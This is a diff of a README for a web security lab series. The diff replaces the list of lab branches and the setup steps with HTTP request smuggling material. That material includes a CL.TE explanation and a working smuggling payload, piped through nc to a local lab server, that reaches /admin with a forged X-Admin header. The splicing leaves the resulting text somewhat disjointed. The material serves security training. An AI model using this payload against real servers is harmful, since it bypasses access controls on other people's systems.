@@ -8,19 +8,12 @@ Z-Vuln-Lab is a hands-on web security lab series designed to help learners pract
 
 ## 📁 Project Structure
 
-Each lab exists in a separate branch:
-
 - **HTTP Request Smuggling**  
   Branch: `http-smuggling-v5`  
   https://github.com/Zwique/Z_Vuln_Lab/tree/http-smuggling-v5
 
-- **JWT Auth Bypass (OAuth)**  
-  Branch: `jwt-oauth`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/jwt-oauth
-
-- **Privilege Escalation**  
-  Branch: `privesc-v3`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/privesc-v3
+- A frontend server parses requests using **Content-Length**, and
+- A backend server parses requests using **Transfer-Encoding: chunked**,
 
 - **Middleware Vulnerabilities**  
   Branch: `middleware-v2`  
@@ -32,16 +25,9 @@ Each lab exists in a separate branch:
 
 ---
 
-## 🏷️ Tags & Releases
+## 🎯 Objective
 
-- **v5.0-http-smuggling**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v5.0-http-smuggling
-
-- **v4.0-jwt-oauth**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v4.0-jwt-oauth
-
-- **v3.0-privesc**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v3.0-privesc
+GET /admin
 
 - **v2.0-middleware**  
   https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v2.0-middleware
@@ -49,10 +35,16 @@ Each lab exists in a separate branch:
 - **v1.0-ssti**  
   https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v1.0-ssti
 ---
+```
+GET /admin HTTP/1.1
+Host: test
+X-Admin: true
+```
 
-## 🚀 How to Use
+# 💥 Exploitation
 
-```bash
-git clone https://github.com/Zwique/Z_Vuln_Lab.git
-cd Z_Vuln_Lab
-git checkout jwt-oauth
+```
+printf 'POST /submit HTTP/1.1\r\nHost: test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: test\r\nX-Admin: true\r\n\r\n' | nc 127.0.0.1 8000
+
+python3 exp.py
+```
